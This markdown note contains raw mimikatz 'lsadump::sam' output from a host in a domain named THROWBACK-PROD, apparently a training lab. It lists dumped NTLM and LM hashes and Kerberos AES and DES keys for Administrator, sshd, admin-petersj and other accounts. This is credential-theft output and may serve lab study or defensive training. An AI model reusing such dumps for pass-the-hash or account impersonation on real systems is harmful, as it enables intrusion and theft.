# lsadump::sam output

```mimikatz
mimikatz # lsadump::sam
Domain : THROWBACK-PROD
SysKey : 528564055c96f1281426ff01b8973ecd
Local SID : S-1-5-21-1142397155-17714838-1651365392

SAMKey : c597488f72f369f51817ca8178b325b7

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a06e58d15a2585235d18598788b8147a
    lm  - 0: 3e595b78debfa3d2988d49caf2dfd39b
    lm  - 1: 319e90512a3fc57e581c0e910c5270e4
    ntlm- 0: a06e58d15a2585235d18598788b8147a
    ntlm- 1: a06e58d15a2585235d18598788b8147a
    ntlm- 2: a06e58d15a2585235d18598788b8147a

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4c1a9d6a83ff957b6a0b0b9e48e4f091

* Primary:Kerberos-Newer-Keys *
    Default Salt : THROWBACK-PROD.THROWBACK.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ec8d489db0d487dfe37c173650c7653d73e2d3ac0b31fc8db1bbbaa379dfe138
      aes128_hmac       (4096) : 8bf7e26efcdeae985347109f5f14e750
      des_cbc_md5       (4096) : 5d8045df7c7a7ca7
    OldCredentials
      aes256_hmac       (4096) : ec8d489db0d487dfe37c173650c7653d73e2d3ac0b31fc8db1bbbaa379dfe138
      aes128_hmac       (4096) : 8bf7e26efcdeae985347109f5f14e750
      des_cbc_md5       (4096) : 5d8045df7c7a7ca7
    OlderCredentials
      aes256_hmac       (4096) : 1d5bbced97a10c52cc342e0bebf0ec58e4f0c6c98a6eae7388623b551c6fb3cf
      aes128_hmac       (4096) : c5440693e636d79f71264dce87900268
      des_cbc_md5       (4096) : 4f3254c11a6852d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : THROWBACK-PROD.THROWBACK.LOCALAdministrator
    Credentials
      des_cbc_md5       : 5d8045df7c7a7ca7
    OldCredentials
      des_cbc_md5       : 5d8045df7c7a7ca7


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce


RID  : 000003f1 (1009)
User : sshd
  Hash NTLM: fe2acb5ea93988befc849a6981e0526a
    lm  - 0: 825dff3d1863d1d9f129e34d013eed86
    ntlm- 0: fe2acb5ea93988befc849a6981e0526a

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7c78c85a0e1e59f89563c6f87dbcccab

* Primary:Kerberos-Newer-Keys *
    Default Salt : THROWBACK-WEB.THROWBACK.LOCALsshd
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 4f85ff8546604d60091a7d4c45f15354bb3bd774a788a19cd76c474066f222a8
      aes128_hmac       (4096) : 9cca8ee88554e12fbb095f58b5f06079
      des_cbc_md5       (4096) : 700e073726c41a9d

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : THROWBACK-WEB.THROWBACK.LOCALsshd
    Credentials
      des_cbc_md5       : 700e073726c41a9d


RID  : 000003f2 (1010)
User : admin-petersj
  Hash NTLM: 74fb0a2ee8a066b1e372475dcbc121c5
    lm  - 0: c732671f3c607da662072d9783564241
    lm  - 1: e00d1de1192672392a0a9c384b35408d
    ntlm- 0: 74fb0a2ee8a066b1e372475dcbc121c5
    ntlm- 1: 74fb0a2ee8a066b1e372475dcbc121c5

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 051f33b7d77d3f461de4a2d72d35615f

* Primary:Kerberos-Newer-Keys *
    Default Salt : THROWBACK-PROD.THROWBACK.LOCALadmin-petersj
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 6e5652cdaeb82c7ef5d93c8df1eaa4f825a2a6e97ab81ca55196ed700b854e05
      aes128_hmac       (4096) : 18d2c5409a103c81a7c5044a7fe76679
      des_cbc_md5       (4096) : 2f38ab83ad7643fb
    OldCredentials
      aes256_hmac       (4096) : 6e5652cdaeb82c7ef5d93c8df1eaa4f825a2a6e97ab81ca55196ed700b854e05
      aes128_hmac       (4096) : 18d2c5409a103c81a7c5044a7fe76679
      des_cbc_md5       (4096) : 2f38ab83ad7643fb

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : THROWBACK-PROD.THROWBACK.LOCALadmin-petersj
    Credentials
      des_cbc_md5       : 2f38ab83ad7643fb
    OldCredentials

```